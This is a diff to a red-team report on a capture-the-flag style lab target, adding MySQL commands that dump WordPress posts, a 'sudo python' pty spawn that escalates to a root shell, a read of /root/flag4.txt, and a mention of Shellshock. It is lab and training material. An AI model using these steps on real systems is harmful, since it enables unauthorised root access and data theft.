@@ -89,7 +89,19 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
     ![4](/Images/1/4.png)
 
-    >#### note: Flags 3 and 4 can be found in different ways. At the end of this report are two ways to access flag3 and flag4.
+    ```
+    mysql -u root -p
+    mysql> show databases;
+    mysql> use wordpress;
+    mysql> show tables;
+    mysql> select * from wp_posts;
+    ```
+
+    **Flag3**
+
+    ![11](/Images/1/11.png)  
+
+    >#### note: Flags 3 and 4 can be found in different ways. At the end of this report is a summary of other methods to access flag3 and flag4.
 
 ---
 
@@ -139,20 +151,20 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
     ![8](/Images/1/8.png)
 
     Steven has the privilege to run python language as a root user
-
     
-    sudo python -c 'import pty;pty.spawn("/bin/bash")'
-    
-
+        sudo python -c 'import pty;pty.spawn("/bin/bash")'
+ 
     ![9](/Images/1/9.png)
-
-     **Flag4**
+    
+        cat /root/flag4.txt
+    
+    **Flag4**
 
     ![10](/Images/1/10.png)
 
 ***
 
-# Alternative ways to access flag 3 and 4
+# Alternative methods to access flag 3 and 4
 
 ## SQL database: **Flag 3 and 4**
 
@@ -166,7 +178,7 @@ mysql> select * from wp_posts;
 
   **Flag3 and Flag4**
  
- ![11](/Images/1/11.png)
+![11](/Images/1/11.png)
 
 ## Binary File: **Flag 3**
 
@@ -182,11 +194,6 @@ mysql> select * from wp_posts;
 **Flag3**
 
 ![12](/Images/1/12.png)
-
-## File: **Flag 4**
-
-`cat /root/flag4.txt`
-
 
 > Others Exploits:
 CVE-2014-6271 Shellshock vulnerability. It is possible to gain shell access through Remote code execution.
